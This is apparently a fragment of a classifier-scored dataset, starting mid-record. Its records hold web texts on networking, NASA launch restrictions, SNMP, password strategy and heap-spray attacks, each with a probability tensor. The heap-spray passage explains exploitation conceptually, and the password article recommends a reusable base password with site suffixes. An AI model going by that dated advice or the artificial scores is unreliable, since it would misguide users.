address. The three types of MAC addresses can be easily identified, as follows: Type Identified by Unicast The first byte is always an even value. Multicast The low order bit in the first byte is always on, and a multicast MAC addresses is an odd value. As an example, notice the first byte (01) of the following MAC address, 0x-01-00-0C-CC-CC-CC. Broadcast They are all binary 1s or will appear in hex as FF FF FF FF FF FF. This lesson discusses the attackerís methodology, as well as some of the methodologies used by ethical hackers. Ethical hackers differ from malicious hackers in that ethical hackers seek to do no harm and work to improve an organizationís security by thinking like a hacker. This lesson also discusses the OSI model and the TCP/IP protocol suite. It looks at some of the most commonly used protocols in the suite and examines how they are used and misused by hackers. Common ports are discussed; as is the principle of deny all. Starting with all ports and protocols blocked leaves the organization in much more of a secure stance than simply blocking ports that are deemed dangerous or unneeded. Excercise_2.doc attached for a normal exercise wondex like this",
        "prob": "tensor([[2.0395e-06, 1.0000e+00]])"
    },
    {
        "text": "November 7, 2007 By Karen Stewartson Traffic signals may soon be smart enough to prevent car crashes. A team of scientists at Technion-Israel Institute of Technology in Haifa, Israel, is creating such signals by connecting computers and cameras to \"stop\" and \"yield\" signs. When the cameras spot two cars approaching an intersection, the computer calculates the collision risk, then flashes warning lights on the sign to alert drivers to slow down or stop. The team's next goal is to invent a smart traffic light, which would delay a green light so an offending driver can clear an intersection without causing a crash. - Businessweek.com London is equipped with 10,000 crime-fighting closed-circuit TV cameras - which cost approximately $400 million - but doubt has been cast on their ability to help solve crime, thanks to an analysis of the publicly funded camera network. By comparing the number of cameras in each London borough with the proportion of crimes solved there, researchers found that police are no more likely to catch offenders in areas with hundreds of cameras than in those with hardly any. Four out of five of the boroughs with the most cameras have a below-average record of solving crime. - Thisislondon Carnegie Mellon University professor Scott E. Fahlman said he was the first to use three keystrokes - a colon followed by a hyphen and a parenthesis - as a horizontal \"smiley face\" in a computer message 25 years ago. Language experts say the smiley face and other emotional icons or emoticons, have given people a concise way in e-mail and other electronic messages of expressing sentiments that otherwise would be difficult to detect. Fahlman posted the emoticon in a message to an online bulletin board at 11:44 a.m. on Sept. 19, 1982, during a discussion about the limits of online humor and how to denote light-hearted comments. - Yahoo.com Mobility on the Move As notebooks become mainstream PC platforms throughout federal agencies, questions abound about the implications for data security. A study by the Telework Exchange, which interviewed 35 federal chief information security officers (CISOs), revealed that federal CISOs do support telework and mobility. CISOs were asked if laptop use has increased. No 17 percent Yes 83 percent CISOs were also asked if they have direct input into their agency's telework infrastructure. Significant input 51 percent Some input 37 percent No input 12 percent An estimated 800,000 customer kiosks, excluding ATMs, will be installed in North America by the end of 2007 and will hit 1.2 million by 2009, according to a report by consulting firm Summit Research Associates Inc. A 2007 forecast showed that North American consumers would spend more than $525 billion at self-checkout lanes, ticketing kiosks and other self-service machines, including postal kiosks by the of the year. That could reach $1.3 trillion by 2011. - IHL Consulting Group Surfing the Net has become an obsession for many Americans. One in three adults give up friends for the Web, according to a survey of 1,011 American adults by advertising agency JWT. Conducted Sept. 7-11, 2007, the survey found that 28 percent of respondents admitted spending less time socializing face-to-face with peers because of the amount of time they spend online. You may use or reference this story with attribution and a link to",
        "prob": "tensor([[0.0135, 0.9865]])"
    },
    {
        "text": "Kennedy Space Center, Fla. Airspace, Bridges and Waterway Restrictions in Effect for All Space Shuttle Launches For the STS-114 launch of Space Shuttle Discovery, NASA managers urge all aircraft pilots and boaters to comply fully with the airspace, bridges and waterway restrictions imposed around KSC prior to and during Space Shuttle launches and landings. \"As always, we are coordinating with officials from the Eastern Range and Federal Aviation Administration (FAA) to help provide a safe launch environment for the Shuttle crew and for interested spectators. Violating these restrictions is not only unsafe for the astronauts and support crews, it's unsafe for the violator,\" said KSC Launch Director Mike Leinbach. Space Shuttle Discovery's first launch opportunity is on July 13 at 3:51 p.m. and the launch window extends for five minutes. At NASA's request, U.S. Air Force and U.S. Coast Guard surveillance aircraft will patrol KSC's airspace boundaries on launch day. Violators will be intercepted by patrol forces, thoroughly investigated and will be subject to FAA enforcement action. A number of restrictions remain in effect around the Kennedy Space Center (KSC) during the hours immediately following the launch of a Space Shuttle. Listed and described below are restrictions that apply to pilots, motor vehicle operators and boaters utilizing airspace, bridges and waterways that lead to KSC. KSC AREA AVIATION RESTRICTIONS For the launch of Space Shuttle Discovery on mission STS-114, all restricted areas surrounding the Kennedy Space Center will be active and the area covered by flight restrictions has once again been expanded for this launch. The length of time the restrictions will be in effect prior to launch has also been extended. Due to international terrorist activities, heightened security is essential to protect the Space Shuttle as a national asset. An inadvertent unauthorized incursion into the area of the Cape Canaveral Temporary Flight Restriction (TFR) could cause a scrub in the launch of Discovery, the activation of airspace defenses and an FAA enforcement action. Local pilots are asked to help NASA by respecting these temporary but necessary restrictions so that the launch can occur on time and without incident. The restricted areas for the Kennedy Space Center and Cape Canaveral Air Force Station are in effect on a continuous basis and are limited to official aircraft only, off-limits to general aviation pilots. The restricted air space extends from the surface to but not including 14,000 feet and covers the area bounded by the Indian River to the west, Port Canaveral to the south, the city of Oak Hill to the north, and three miles over the Atlantic Ocean to the east. On launch day these restricted areas will be expanded and will be activated beginning at launch minus 9 hours. On Wednesday, July 13 this occurs at 6:35 a.m. EDT and remains in effect until 6:59 p.m. EDT. Should the launch be scrubbed after the astronauts have boarded Space Shuttle Discovery, the restrictions will remain in effect for three hours after the postponement has been announced. FAA Part 91, Part 125, general aviation and VFR operations are prohibited within a 30 nautical mile radius of Launch Pad 39-B from the surface to but not including 18,000 feet (located on the Melbourne VOR/DME 004-degree radial at 30 nautical miles). Among the general aviation airports affected within this area are Space Coast Regional Airport in Titusville, Arthur Dunn Airpark in Titusville, Merritt Island Airport in Merritt Island, Rockledge Airpark in Rockledge and Massey Ranch in Edgewater. Within an airspace radius between 30 and 40 nautical miles of Pad 39-B, a discrete transponder code must be obtained and clearance granted from air traffic control before entering this airspace. Continuous radio communications must be maintained. Before flight, pilots should contact the FAA Flight Service Station at 1-800/WxBrief (1-800/992-7433) for details of the restrictions contained in the NOTAMS. In flight, outside Orlando Class B airspace, pilots should contact Daytona Beach Approach control on 134.95. In the Melbourne area contact Daytona Approach on 132.65, or in the New Smyrna Beach area on 125.35. Flight Service can also be reached locally by radio on the Titusville RCO at 123.6 or the Melbourne RCO on 122.6. Advisories will also be available from the control tower at Space Coast Regional Airport in Titusville at 118.9 megahertz. Among the airports affected within the 30-40 nautical mile radius in which flight is permitted but under positive air traffic control are Orlando International Airport, Orlando Executive Airport, Orlando-Sanford International Airport, the New Smyrna Beach and Spruce Creek airports, Melbourne International Airport and Valkaria. Pilots are encouraged to consult the most recent FAA aeronautical chart for Orlando Class B air space. BRIDGES CONTROLLED FOR LAUNCH The opening and closing of bridges over waterways surrounding KSC will be strictly controlled during the hours immediately before and after the launch period for each Space Shuttle mission. Bridges affected by the launch include: * Canaveral Harbor Barge Canal (SR 401, south of Cape Canaveral Air Force Station's Gate 1); * Indian River Causeway West or NASA Causeway (Intracoastal Waterway at Addison Point); * Merritt Island Barge Canal (Merritt Island State Road 3); * Haulover Canal Bridge (State Road 3, north of KSC). Restraints on bridge openings for boat traffic begin three hours before launch. The bridges may be opened for five minutes at the following points in the launch countdown: T-180 minutes, T-150 minutes, T-120 minutes, T-90 minutes, and T-65 minutes. Adding 20 minutes to these times and subtracting that amount from the launch time will result in an approximate time of openings. Bridges will remain closed to boat traffic until 90 minutes after lift-off (T+90). They may then open for five minutes at T+90, T+120 minutes and T+150 minutes. Bridge operations will return to normal three hours (T+180 minutes) after launch. Should the Shuttle be required to perform a Return-to-Launch-Site (RTLS) landing at KSC, all bridges would remain closed to boat traffic from 45 minutes before landing until at least one hour after landing. KSC AREA BOATING RESTRICTIONS Waterways and boating activities near the Kennedy Space Center will be strictly controlled prior to and during the launch of the Space Shuttle. Safety and security requirements, including U.S. Air Force range safety impact limit lines, will go into effect as early as three days before launch. Other requirements will be phased into effect through sunset the night before launch. A general description of the area follows: ATLANTIC OCEAN: Beginning noon on Sunday, July 10 through the launch, a general exclusion zone will be in effect three miles offshore from the Haulover Canal, near the north end of KSC, and southward to Port Canaveral. Four hours prior to launch, all ocean-going traffic will be restricted from entering an area measured from nine miles north and south of the launch pad and extending 64 miles east into the ocean. An additional three-mile-wide exclusion zone will be extended eastward along the flight path of the Space Shuttle. MOSQUITO LAGOON: This area south of the Haulover Canal in the Mosquito Lagoon is off limits to all boats beginning the day before launch. INDIAN RIVER: Restrictions apply from the NASA Causeway north to the Haulover Canal and east of the Indian River's main channel. Restrictions begin at noon on Sunday, July 10. BANANA RIVER: Security limits begin at the Banana River Barge Canal south of KSC at the State Road 528 crossing and extend north. This restriction is effective roughly 16 hours prior to launch. All boating restrictions will be lifted approximately one hour after launch. Boating interests should monitor U.S. Coast Guard Channel 16 broadcasting from Port Canaveral. The U.S. Coast Guard, the U.S. Fish and Wildlife Service, and KSC security forces share responsibility for enforcing the boating guidelines. ROAD CLOSURES: Space Commerce Way which connects State Road 3 with State Road 405 (NASA Causeway) will be closed on launch day, July 13 beginning at 8 a.m. It will reopen after launch at 6 p.m. The closure is necessary due to the expected high volume of traffic on these highways. - end - text-only version of this release To receive status reports and news releases issued from the Kennedy Space Center Newsroom electronically, send a blank e-mail message to email@example.com. To unsubscribe, send a blank e-mail message to firstname.lastname@example.org. The system will confirm your request via e-mail.",
        "prob": "tensor([[0.1091, 0.8909]])"
    },
    {
        "text": "domain name dispute A domain name dispute is a conflict that arises when more than one individual or group believes it has the right to register a specific domain name. Most commonly a domain name dispute would occur when a domain name similar to a registered trademark is registered by an individual or organization who is not the trademark owner. All domain name registrars must follow the ICANN's Uniform Domain-Name Dispute-Resolution Policy (UDRP). See \"Registering a Domain Name\" and \"Understanding Internet Governance\" in the Did You Know...? section of Webopedia. See also \"Countries and Their Domain Extensions\" in Webopedia's Quick Reference Section. Featured Partners Sponsored - Increase worker productivity, enhance data security, and enjoy greater energy savings. Find out how. Download the “Ultimate Desktop Simplicity Kit” now.» - Find out which 10 hardware additions will help you maintain excellent service and outstanding security for you and your customers. » - Server virtualization is growing in popularity, but the technology for securing it lags. To protect your virtual network.» - Before you implement a private cloud, find out what you need to know about automated delivery, virtual sprawl, and more. »",
        "prob": "tensor([[8.1695e-05, 9.9992e-01]])"
    },
    {
        "text": "The Simple Network Management Protocol (SNMP) has been widely used in enterprise networks to effectively manage systems, network devices, and networks. The widespread use of SNMP has raised many issues relating to managing systems and networks. One of the benefits of SNMP is how quickly solutions may be created to support the increasing numbers of networking components and applications. Within SNMP networks, the number of entities (systems, components, and applications) that need to be managed is growing rapidly. There is a need to respond to the industry's demand for more flexible and dynamic management of multiple devices. The initial network management solution, that is based on SNMP, allowed developers to create one monolithic agent per system/device listening on a single port (port 161). It was soon discovered that this SNMP solution had many constraints and was not flexible enough to effectively manage all the devices necessary. New technology was needed to produce multiple agents by different people, that could manage different components and applications separately within a device. This resulted in the new extensible agent technology or Master/subagent technology. Based on this technology, Sun provides a solution named Solstice Enterprise Agent (SEA). The agents consist of Master Agent and subagents. The Master Agent receives the SNMP-based management requests from the managers and sends responses to these management requests. The responses are sent after retrieving the appropriate values from the respective subagents. The subagents provide management of different components based on Management Information Based (MIBs or MIFs) specifically designed for components/applications. The Enterprise Agent also allows you to integrate and use SNMP-based legacy agents. In subsequent chapters, the roles of the Master Agent and subagents are discussed in detail. The SNMP based component of the SEA product consists of various components. Figure 1-1 illustrates the architecture of the SEA. The following is a description of each of the components associated with the SEA product. The Master Agent listens on port 161. Subagents are zero or more processes that have access to the management information and provide manageability to various applications/components within a system. These subagents interact with the Master Agent using SNMP. These subagents do not interact with the managers directly. The Software Development Toolkit has multiple components. It includes agent/subagent libraries, a MIB compiler, and example subagents. The MIB compiler parses a MIB and creates stub files. The stub files consist of functions that you modify and enhance appropriately to provide manageability of the respective component or application. Legacy SNMP Agents are SNMP-based and work as monolithic entities in a system. The Enterprise Agent allows the integration of legacy SNMP agents. The legacy agents are those agents already in released products from Sun or other companies. The Enterprise Agent technology also allows you to integrate DMI 2.0 functionality. This is accomplished through the mapper, that acts as a subagent. The mapper receives requests from the Master Agent and converts them into appropriate DMI requests, that are then sent to the DMI Service Provider. When the mapper receives the response back from the DMI Service Provider, it converts this response into the SNMP response and forwards it to the Manager through the Master Agent. A subtree is indicated by a single oid. The Master Agent has no understanding of what this subtree is without any MIB specification. The subtree may actually be an entire MIB (e.g., 'host'), a full instance (e.g., hrDeviceDescr.42), or may not even be a subtree named in any MIB specification. Dispatching is the communication of a management request from the Master Agent to one or more subagents. Dispatching is performed according to the Master Agent's current view of registered subtrees, and an explicitly stated algorithm. Additional terms are described in this guide's glossary. The Master Agent receives SNMP requests from the system managers and sends responses to these requests, after determining appropriate values from the subagents. The subagents provide management of different components based on the Management Information Base (MIB) specifically designed for such components/applications. Each subagent, when invoked dynamically, registers with the Master Agent. During registration, it informs the Master Agent of the MIB subtree it manages. For more information, refer to Chapter 3, SNMP-Based Master/Subagenton page 3-1. The SEA technology provides a software development kit that allows you to create, release, and install subagents. Additionally, the SEA allows you to integrate and use SNMP-based legacy agents. The Desktop Management Interface (DMI) is a set of interfaces and a service provider that mediate between management applications and components residing in a system.The DMI is a free-standing interface that is not tied to any particular operating system or management process. Sun provides DMI based functionality for management of the Sun platforms (hardware and software) and software applications running on these platforms. The DMI subagent is one type of subagent included in the SEA product. By using DMI, you may manage various elements within most systems (for example, PCs, workstations, routers, hubs, and other network objects). A format for describing management information (MIF) A Service Provider entity Two sets of APIs An interface between management applications and the Service Provider An interface between the Service Provider and component instrumentation A set of services (using ONC/RPC) for facilitating remote communication For more information, refer to Chapter 5, Using DMI. The Master Agent acts as the primary interface between the network manager and the subagents. The requests received from the manager are parsed by the Master Agent. If necessary, the original requests are broken into multiple requests. The original request is distributed by the Master Agent based on the manageability provided by each subagent. The request is then forwarded to the appropriate subagents, which provide a response to each request. After collecting all the responses from each subagent, the final response is sent to the network manager. Only one Master Agent presides over the Master/subagent model. The Master Agent acts as a request scheduler and dispatcher for all subscribed subagents. In addition, the subagents send traps to the Master Agent, that are then forwarded to the manager. Figure 1-2 illustrates the Master Agent as it relates to the architecture of SEA.",
        "prob": "tensor([[1.9896e-05, 9.9998e-01]])"
    },
    {
        "text": "A USB key, also known as a thumb drive or USB drive, is a kind of digital briefcase—a place to store files while you move them from one computer to another. If you’re carrying around confidential business or personal information and want to keep it safe, look for a USB key that features encryption, or scrambling, of your data and requires your PIN or password to access it. Government or business users who want to make sure an encrypted USB key is secure, however, must look carefully at how these security features work. To achieve the highest level of security, a USB key must include a dedicated security computer chip, for example a smart card chip. This tamperproof container securely stores the data encryption key and verifies your PIN/password to access the data, so it is not vulnerable to attacks on the USB key software. In addition, the key should comply with strong, military-grade encryption standards, such as the U.S. government’s Advanced Encryption Standard 256 (AES-256). For example, researchers recently hacked into popular USB keys claiming to be secure. Using a flaw in the USB key software that checks your password, the researchers were able to read the data on these “secure” devices without knowing the password. More information about high security USB keys is available online.",
        "prob": "tensor([[2.0590e-04, 9.9979e-01]])"
    },
    {
        "text": "Lessons in cyber security will now be stepped up in schools in the hope of creating a new generation of IT specialists who can counter hackers, state sponsored attacks and online criminals. The country’s critical infrastructure, such as emergency services, communications, transport and utilities are also under threat because companies are not taking cyber security seriously enough, the National Audit Office report said. The UK suffered 44 million cyber attacks in 2011 – the equivalent of 120,000 a day – and it is estimated to cost the country up to £27 billion a year. But there is a lack of skilled people available to properly protect against such incidents, the report said. It said the number of specialists in the UK has not increased in line with the growth of the internet. It said the shortage of skills “hampers the UK’s ability to protect itself in cyberspace” and that the current pipeline of available talent would not meet demand. “Those we interviewed from academia considered that it would take up to 20 years to address the skills gap at all levels of education.” The report blamed a lack of promotion of science and technology subjects at school. It said the Government now “expects cyber security to be a strong strand of the future GCSE computer science syllabus”. There have been concerns that the intelligence and security agencies, especially GCHQ, have struggled to attract and retain the most skilled computer specialists because they can earn far more in the private sector. Last year, Jonathan Evans, the director general of MI5, said the \"astonishing\" level of cyber attacks from enemy states and criminals was threatening government secrets and businesses. The NAO report today warned the national infrastructure, which also includes food, health and financial services, were essential to daily life but at risk of attack. It said the majority of services are privately owned and the Government has recognised that it needs to work with industry. “It considers, for example, that cyber security is not well understood at board level and executives have difficulty assessing the impact of cyber security risks,” it said. Amyas Morse, head of the NAO, said: \"The threat to cyber security is persistent and continually evolving. \"Business, government and the public must constantly be alert to the level of risk if they are to succeed in detecting and resisting the threat of cyber attack.\" The Government's cyber strategy has already started to deliver benefits, the NAO said, with the Serious Organised Crime Agency catching more than 2.3 million compromised debit or credit cards since 2011, preventing a potential loss of more than £500 million. MP Margaret Hodge, chairwoman of the Public Accounts committee, said: \"The use of the internet for commerce and communication is a force for good, but it also poses new and growing threats that government, businesses and individuals cannot ignore. \"With around 80 per cent of the internet in private hands, crossing international boundaries and spanning different jurisdictions, the Government cannot approach internet security in isolation. \"Having a robust and well thought-through strategy is crucial if the Government is to respond effectively to cyber threats.\"",
        "prob": "tensor([[2.0294e-06, 1.0000e+00]])"
    },
    {
        "text": "Everyone and their mother has a password security strategy, some better than others. Choosing the right one means weighing security against convenience so you can stay safe without losing your mind. But what's the best balance? Is it the same for everyone? With the help of a security expert, I decided to find out. Over the years, we've posted several password security tips, tricks and techniques ranging from the simply memorable to the perfectly paranoid. Although I've always used strong passwords, many of my coworkers went through great lengths to heighten their security far beyond mine. I knew my passwords needed an audit, but the security measures put forth by my colleagues seemed so frustrating and inconvenient. I wanted safety but without all the hassle. To find out the best combination of security and convenience, I decided to audit all the methods we recommend with the help of security and investigations expert Brandon Gregg. Before we can get started, however, we need to know what makes our passwords vulnerable. The Three Variables That Contribute to Weak Passwords Brandon explained that weak passwords have three variables, and each makes them more vulnerable: - An easily guessed/cracked password: Brandon says, \"With Amazon EC2, GPUs*, and software like Accessdata's Distributed Network Attack (DNA), guessing half a billion passwords per second is easy. My personal record is 370 million guesses per second—not crazy, but better than most Law enforcement agencies. It also appears that some sites, such as Twitter, allows these kinds of brute force attacks against user accounts as long as the ‘password guess' is from randomized IP address each attempt.\" With so many guesses possible per second, you don't want an easily crackable password. Later in the post, we'll discuss which methods produce the most secure and reliable passwords. - An easily forgotten password: Your passwords don't help you if you can't remember them. Brandon says, \"Always resetting your hard-to-remember password just leads to more mistakes and exposures in the future.\" - One password provides access to many sites: Using the same password for everything means that if a hacker cracks one of your accounts, they've cracked them all. *GPUs or graphics cards are used to brute force passwords due to how they tackle parallel calculations. One GPU or clusters of GPUs can be made fairly cheaply and are multiple times faster at guessing passwords than their CPU brothers. Eliminating one or two of the three variables doesn't require much effort, but removing all three causes the higher level of inconvenience I, and many people, hope to avoid. While no security strategy lacks vulnerabilities, in this post we'll audit several types of passwords, from weak and strong and methods of managing them to find out what's the best for convenience and what's the best for security. The Four Levels of Password Security Least Secure: Simple Alphanumeric Passwords The weakest type of password involves combinations of numbers and letters, or just one of each. It may be easy to remember a word, your phone number, or both, but these passwords are easy to crack. Existing software has no trouble guessing dictionary words, phone numbers, or even combinations of both—especially when the password is under eight characters. That said, you won't forget a simple password. If you use it for every account you own, you won't have to remember much at all. Of course, this is extremely insecure. If using a simple and short password, especially across many accounts, you're not far off from using no password at all. For more on why weak passwords are easy to crack, read this. Examples: charlie, hotstuff, 8675309, mary212 Somewhat Secure: Complex 8+ Character Passwords Complex passwords require more effort to type, but they also require far more effort to hack. A complex password consists of at least eight characters. You should include capital and lowercase letters, at least one number, and at least one symbol (e.g. !, ?, @, etc.). You should also avoid a single dictionary word (e.g. pantomime → p@nt0m!me). Using a phrase as a starting point is better, but again, not perfect (e.g. \"I love goats → iLuVg0@ts). This method fails when you use a unique password for every site because you have to remember many, many complex strings of letters, numbers, and symbols. Examples: t@lk4Ev3r!, iLuVg0@ts, b3stFr13ndS4eVer?! Very Secure: A Common Complex Base Password with Unique Identifiers You can't easily remember a lengthy, complex password, so utilizing different ones for every account just doesn't work (unless you're also using a password manager, but we'll get to that later). Remembering just one, however, makes things much easier. It also makes your password less secure unless you add a unique identifier. That unique identifier can relate to the site so you won't forget it. For example, if you used iLuVg0@ts as your common base password and you wanted to create a password for Gmail, you could use iLuVg0@ts-gmail. Brandon prefers this method over others: Having a common base password plus the site name actually removes all three variables. Due to length it won't be cracked by a dictionary or brute force attack. If Linkedin gets compromised your Gmail will remain safe and lastly you aren't going to forget your password. It's the best option available. Examples: iLuVg0@ts-gmail, iLuVg0@ts-linkedin, iLuVg0@ts-facebook Of course, if a savvy hacker managed to crack one password they might figure out the others. Brandon suggests: In my own passwords I mix up the \"site\" password not with a direct label of GMAIL or LinkedIn, but with email for gmail or resume for linkedin. Something again that is easy to remember, but hard to guess if your account is compromised. Examples: iLuVg0@ts-email, iLuVg0@ts-resume, iLuVg0@ts-friends With common basename passwords, you have another secure option: using a three word phrase with spaces (e.g. \"goats love gmail\"). This method may seem less secure because it includes simple dictionary words, but it works because spaces are in play. (You can read more about the three word method here.) Brandon notes that this method sometimes fails because of how sites and applications restrict your password options: The three word method is a good idea, but limited by many of the websites and applications you use. It solves the hard to crack problem and easily compromised issue, but not the easy to remember. Why, you ask? Most sites don't allow spaces as a special character, so you are stuck using \"goats@love@gmail.\" Some sites even prevent the number of special characters you use, so you might have one application that allows password A and another that does not. The next thing you know you have five different password styles and you can't remember which style belongs to which login. Examples: goats love gmail, goats@love@facebook, goats!love!pinterist As mentioned, neither solution comes without vulnerabilities. If all your sites allow spaces or don't restrict special characters, the three word method offers greater simplicity. Either way, a common base password and a unique identifier offers both security and convenience. Extremely Secure: Two-Factor Authentication and Passwords Even You Don't Know No password is more secure than a lengthy, complex string of characters that nobody knows. The obvious problem? You can't enter a password you don't know. Password managers like LastPass solve this problem by storing all your passwords in a single database, unlocked by one unique password of your choosing. Of course, as Brandon points out, this comes with one major flaw: Personally, I am fearful of any password manager used to centralize my accounts. As someone who \"monitors\" many systems I can personally tell you that if I capture your LastPass master password it's like opening up a nicely wrapped present. I was only going to target your Twitter account, but you just gave me a one stop shop to all your accounts, even the banking accounts I had no idea you had. Thank you LastPass and the lazy user. Using a password manager suffers from a similar vulnerability to using the same password for every site: you crack one, you crack them all. While LastPass, in particular, makes great efforts to keep your passwords safe, you're putting yourself at risk by using one password to rule them all. The solution? Two-factor authentication, something you may have heard about recently. Brandon explains how it works: Two-factor authentication adds a layer of security that is almost impossible to bypass. After using one of the password options above, Google (and other sites) send a text message to your phone. Not only is it hard for hackers to obviously be watching your phone (unless this installed FlexiSPY or other cell monitoring tools) it gives you a heads up to being attacked. If you suddenly get a text message with an authorization code at 2:00 AM, it might be a sign your ex-girlfriend is trying to get into your account. When using a password manager like LastPass, you should enable two-factor authentication or you are, as Brandon puts it, potentially offering up your passwords as a nicely wrapped present. While we often argue this method secures your accounts better than any method, it also creates the most inconvenience. You'll need to decided whether that inconvenience matters to you or not. How Do I Choose the Best Password Security for Me? Securing your accounts means choosing a balance between convenience and protection. If you're willing to tolerate regular security checks and use randomly-generated passwords you don't know, you can put your paranoia to rest. Most Lifehacker writers and editors use this level of password security because they don't want to assume the risk and find little inconvenience in the extra effort. In fact, many adjusted to the new methods and haven't found two-factor authentication to be inconvenient at all. You may feel the same way. Personally, I find this method excessive and too much of a burden. As a result, I've opted for our third level of security (\"Very Secure\") described above for two reasons. First, using a method that requires a password manager involves trusting someone else with your data. When you give someone else your data you take a risk that they may lose it or share it (whether intentionally or not). If you've ever told a friend a secret, you understand the potential risk. The only well-kept secret is the one you keep yourself. While you can't avoid sharing your information entirely, as that would lead to a horribly insulated life, I believe in keeping how much you share that information to a minimum. Second, I want reasonably easy access to my data and I'm okay with assuming some risk. As someone who's had his fair share of hardships, I don't believe in trying to live life risk-free. Bad things happen. We should take reasonable measures to prevent them, but sometimes they still happen. To me, a tiny bit of added security isn't worth the inconvenience. What should you choose? Brandon sums up the decision-making process nicely: Security is not always about who has the best alarms, tallest fences, or latest technology. There are many variables in security that often times people overlook including cost and convenience. We can lock down our computers, phones, and Internet with full encryption, bio-readers, and multi-level authorization, but if you don't assess your own realistic risk you can easily weigh yourself down by high costs and slow access. While two-factor authentication is currently one of the best methods of protecting your data, the added time for the second level of authorization can become a nuisance and maybe overkill. Are you afraid of China snooping in your Gmail? If not, no two-factor authentication is needed. Is there a real concern your savings account can be hacked? Use two-factor authentication on all banking sites that offer it. Better understand your risk to better choose the level of security you need. The level of risk you want to take depends on your personal needs and the level of risk you're willing to take. Just remember—while you can implement extreme security protocols, nothing prevents the possibility of a hack. Everything is vulnerable. Back up your data. Keep a close eye on your accounts. Security involves more than locking everything down with good passwords. You should prepare yourself for the worst. In the meantime, however, lock down your accounts in a way that's secure enough for you and fits well into your life. Special thanks to Brandon Gregg for his expert advice. Brandon has worked investigations for numerous Fortune 500 companies over the last 12 years investigating theft, fraud, organized crime, corporate espionage, and many high profile cases as well as being an educator, published author, and featured speaker on surveillance, computer forensics, complex investigations, and ethical hacking. You can find out more about him here.",
        "prob": "tensor([[2.0921e-06, 1.0000e+00]])"
    },
    {
        "text": "Making Abstract Data Types Abstract An approach to make systems safe from heap spray attacks Doug Tygar is an expert on computer security in the broad sense. It started with his thesis work on building secure operating systems. This work was notable for its unique approach to this fundamental problem, partly driven by the views of his famous advisor Michael Rabin. Since then he has continued working on all aspects of security: including attacks against intrusion detectors themselves, covert channels, and spam and botnet protection. Today I want to talk about some attacks on software systems and an attempt to try to model them formally, and perhaps prevent them. This is related to some research of Doug’s, but the ideas here are work still in progress. Doug started his career as junior faculty at CMU, where he taught a class on security. One thing about CMU students, in general, they are good “hackers.” Even theory students are known for being able to write code, and the systems students are seriously good. At the start of the class, Doug announced to his students he had a great password and that no one would be able to break it. I am not sure why he challenged the class, but he did. It was not a good idea—do not wave red flags at a bull—or in this case at a class full of them. The game was on. In a couple of days the class had figured out his password. The problem they solved is given a “one-way” function and a string , find a string , the password, so that They had used a standard dictionary based attack: try all the words from some dictionary, and test each to see if . Usually, these programs are a bit more clever and can get a password like “99hello” quite easily. They told Doug his password, and so he changed it to a better one. Game on. This they still cracked, even though it took much more computer time, but they still got it. Now Doug announced to his class that he had picked a password that would foil these simple dictionary attacks. But, he made a small error, he told them how he had selected the password. He wanted a password he could remember, so he used his knowledge of Japanese. He told them he had used a Japanese phrase as his password. He smiled to the class, and told them to forget about trying to crack this password. They decided to attack his password, Japanese or not. Of course he had to write his phrase as a series of roman letters, since the login routine did not accept Japanese characters. There are standard ways to encode Japanese into roman letters, see this; thus, they built their own special dictionary for Japanese phrases. It was a lot of work, but in a week or so, and with some luck, they again broke his password. Doug was getting tired of this game of password cracking: he wanted them to work on more important security projects. So he told his class he had changed his password to a random string of letters: Let’s move on, I win. Of course this was not the end, recall these were CMU hackers. They knew the attacks using dictionaries were out, but there were other ways to get passwords. In those days, this was many years ago, the CMU department was using workstations that allowed users to listen in on all the ethernet traffic on the network. Essentially they could sniff the packets as they went by, whether they were meant for them or not. So they wrote a program that examined each packet. The goal was to find packets that looked like they were part of a remote login. Each time they found one they got a and checked to see if it was Doug’s password. After a few days, a packet went by with his password, and they had him. The key insight was that the operating system did not encrypt passwords when logging into remote machines. After Doug heard they had his password again, he gave up. Game over. You win. He told them his new password—this stopped all attacks. And the class moved on to more interesting issues concerning the security of systems. Let’s move on to a class of interesting attacks on systems. One of the fundamental ways that malware takes over a system is this: - First, the malware runs in normal mode and does something legal, but something that will help it break your system. Often this involves writing some data somewhere in memory by legal means. - Then, the malware uses some bug, and jumps to a given location in memory. - Now, the malware is running its own code and does whatever it wants to do to you. The second step is critical. Without the bug or hole in your system the malware would likely be unable to run the code that it wants to run. However, modern software systems are large, complex, and distributed: all make “preventing the jump” step very hard. Thus, the need for methods that detect or even protect systems from this type of attack. In early attacks the malware could control the jump step—it could decide where to jump to exactly. The software bug that was exploited allowed the malware to jump to a specific location. This made the malware’s job pretty easy: place its code there and jump. However, as software engineers have become more aware of attacks, there are less predictable ways for malware to take control. Today many bugs allow malware to jump into memory, but not to a specific location. The challenge is simple: given that malware can jump into memory, how does the malware make sure it can jump into its code? It would be useless, from the malware’s point of view, to jump into the middle of legal code or data. Likely, this type of jump might crash the system, but would not allow the malware to take over. Hence the creation of heap spraying. Sounds like a garden product: use “heap spray” and all your weeds will go away. The idea of heap spraying is simple, since the jump is unpredictable, place many copies of the malware code all over memory. Then, when the jump occurs, there will be a good chance that the malware jumps into its own code. There is one further simple idea to make this work. The malware wants to get to the start of its own code—jumping into the middle is not very useful. So nop sleds are used. Imagine memory is filled with pieces of code like this: Here is typically a “nop.” Note, now as long as the jump hits the sequence the malware’s code will get executed properly. Here is an example of how this type of attack looks: The Problem: Abstract Data Types I see the problem as: the malware is given legal access to some abstract data type. During the first part of the attack the malware can do any legal operations on the data type. In the above example, the malware just filled an array—legally—with its sled and code. However, later on the malware will do the jump step. This will take it into the memory and perhaps with luck it will hit a nop sled and then execute its malware code. The problem is: the abstract data type is not abstract. A white hat programmer only uses the correct calls to the data type; on the other hand, the malware jumps into the middle of the data type. This is an abuse of the data type, and is how the malware gets control of the machine. Here is a “solution” to the heap spray problem based on the use of theory type ideas. I say “solution” for the following reason: unless the exact attacks are clearly defined the solution can still fail—more on this later on. I do think, however, that ideas from theory could easily play a bigger role in the security of modern systems. I will explain the idea for the simple data type of a one-dimesional array of integers. Imagine some scripting language that hat allows programs to access arrays. They can execute to write the array value, and execute to read the array value. The implementation of the array type is changed very slightly. I need to explain how it is created, read, and written. Create Array: A random value integer is selected. The array is set up as usual: let denote the memory locations where the array is stored. Write Array: Suppose is to be written into . Then, execute Read Array: Suppose is to be read from . Then, execute and return the value . The point of this is the values stored in the actual memory are not the “raw” values sent to the data type. They are scrambled to make them appear random. Clearly, a jump now will hit, Thus, a malware program that fills memory with nop sleds and then jumps is likely to hit random garbage. This may cause an exception or even a crash, but will unlikely allow the malware to take over the system. Does This Work? I believe the above is a pretty good “solution.” However, it could be defeated if the 